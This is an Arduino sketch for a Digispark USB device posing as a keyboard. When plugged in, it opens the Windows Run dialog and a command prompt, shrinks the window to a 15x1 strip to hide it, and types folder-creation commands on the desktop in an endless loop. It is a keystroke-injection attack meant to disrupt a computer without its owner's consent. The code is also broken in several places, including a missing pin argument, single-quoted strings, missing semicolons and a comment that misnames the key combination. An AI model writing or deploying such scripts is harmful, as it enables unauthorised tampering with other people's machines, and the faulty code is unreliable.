#include "DigiKeyboard.h"

void setup() {
}

void loop() {
	digitalWrite(HIGH); // Set port 1 to high logic level
	DigiKeyboard.sendKeyStroke(0);
	DigiKeyboard.delay(600); // wait 600 thousandths
	DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Ctrl + R + left = open windows run
	DigiKeyboard.delay(600); // wait 600 thousandths
	DigiKeyboard.print('cmd') // type cmd
	DigiKeyboard.sendKeyStroke(KEY_ENTER); //enter/return
	DigiKeyboard.delay(300); // wait 300 thousandths
	DigiKeyboard.print("MODE CON: COLS=15 LINES=1"); // reset cmd 15x1 window
	DigiKeyboard.delay(200); // wait 200 thousandths
	DigiKeyboard.sendKeyStroke(KEY_ENTER); //enter/return
	DigiKeyboard.delay(400); // wait 400 thousandths
	DigiKeyboard.print('cd Desktop') // access the Desktop
	DigiKeyboard.delay(300); // wait 300 thousandths
	DigiKeyboard.sendKeyStroke(KEY_ENTER); //enter/return
	DigiKeyboard.delay(300); // wait 300 thousandths

	for(;;) {
		DigiKeyboard.print('mkdir folder name'); // infinitely create multiple folders on desktop
		DigiKeyboard.delay(800); // wait 800 thousandths
		DigiKeyboard.sendKeyStroke(KEY_ENTER); // enter/return
	}
}
